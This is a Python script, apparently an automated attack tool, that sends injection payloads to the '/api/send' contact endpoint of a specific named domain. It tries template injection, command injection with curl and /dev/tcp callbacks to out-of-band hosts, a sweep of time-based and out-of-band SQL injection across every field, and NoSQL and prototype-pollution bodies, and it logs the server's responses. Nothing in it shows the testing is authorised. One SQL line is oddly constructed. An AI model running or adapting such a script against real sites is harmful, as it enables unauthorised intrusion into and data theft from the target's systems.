import subprocess, urllib.parse, json, sys, time
H = ".".join(["www","infinitycapital","bh"])
B = "https://" + H
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
LOG = open("/work/atk3_evolve.log","a")

def post(data, hdrs=None, ct="application/x-www-form-urlencoded", out="/tmp/a2.bin"):
    cmd = ["curl","-sk","-X","POST","-A",UA,"-D","/tmp/a2.h","-o",out,"-w","%{http_code} %{size_download} %{content_type}"]
    for h in (hdrs or []): cmd += ["-H",h]
    if ct: cmd += ["-H","Content-Type: "+ct]
    cmd += ["--data-binary", data, B+"/api/send"]
    subprocess.run(cmd, capture_output=True, text=True)
    hdr = open("/tmp/a2.h").read()
    body = open(out,"rb").read()
    return hdr.split("\n")[0].strip(), hdr, body

def form(f):
    return "&".join("%s=%s"%(k,urllib.parse.quote(str(v),safe="")) for k,v in f.items())

def rec(label, st, hdr, body):
    line = "### %s\nSTATUS: %s\nHDRS: %s\nBODY: %r\n" % (label, st, hdr, body[:600])
    print(line)
    LOG.write(line); LOG.flush()
    time.sleep(2.5)

OOB = lambda p: p  # hosts passed in

def run(hosts):
    sq, cm, ss, ns = hosts
    base = lambda: {"fname":"Test","lname":"QA","areacode":"973","tel":"5551234",
            "cname":"QA Tester","subject":"Hello there","msg":"Testing body",
            "check":"on","targets":"probe@pentest-activator.invalid"}

    # --- SSTI markers in subject / msg
    f = base(); f["subject"] = "{{7*7}} ${7*7} <%= 7*7 %> #{7*7} {7*7} {{constructor.constructor('return 1')()}}"
    f["msg"] = "{{7*7}} ${7*7} <%=7*7%> INJ{{marker"
    rec("SSTI-subject-msg", *post(form(f)))

    # --- Command injection in msg / subject / fname / lname
    cb = "http://" + cm + "/cmdi"
    f = base(); f["msg"] = "x; curl " + cb + "; $(curl "+cb+") `curl "+cb+"`"
    f["subject"] = "`id > /dev/tcp/" + cm.split(".")[0] + "/80`"
    f["cname"] = "; curl " + cb + "/cn; #"
    rec("CMDI-msg-subject-cname", *post(form(f)))

    # --- SQLi payloads in each field (both quote styles, time-based)
    cb2 = "http://" + sq + "/sq"
    sqli_variants = [
      "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
      "1\"; WAITFOR DELAY '0:0:5'-- -",
      "1' OR (SELECT LOAD_FILE(CONCAT('http://" + sq2 if False else "http://" + sq + "/l')))-- -",
      "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -",
      "1; SELECT pg_sleep(5)-- -",
      "1' UNION SELECT 1,2,3-- -",
    ]
    for pname in ["fname","lname","cname","subject","msg","areacode","tel","targets","check"]:
        for pv in sqli_variants:
            f = base(); f[pname] = pv
            st,h,b = post(form(f))
            LOG.write("SQLI %s :: %r -> %s %r\n" % (pname, pv[:60], st, b[:200]))
            LOG.flush()
            time.sleep(2.0)
    print("SQLI sweep done")

    # --- NoSQLi / type confusion (JSON body, matching the documented `to`-style schema)
    nosql_bodies = [
      {"to":{"$gt":""},"subject":"x","text":"y"},
      {"to":["a"],"subject":{"$ne":None},"text":"y"},
      {"$where":"1==1"},
      {"to":"a","subject":"x","text":"y","__proto__":{"polluted":True}},
      {"to":"a","subject":"x","text":"y","constructor":{"prototype":{"polluted":True}}},
      {"to":"a","subject":"x","text":"y","email":"probe@"+ns},
    ]
    for nb in nosql_bodies:
        rec("NOSQLI %s" % json.dumps(nb)[:80], *post(json.dumps(nb), ct="application/json"))
        # also as form-encoded
        if isinstance(nb, dict):
            flat = {}
            for k,v in nb.items():
                flat[k] = json.dumps(v) if isinstance(v,(dict,list)) else v
            rec("NOSQLI-form %s" % json.dumps(nb)[:60], *post(form(flat)))

if __name__ == "__main__":
    run(sys.argv[1:5])
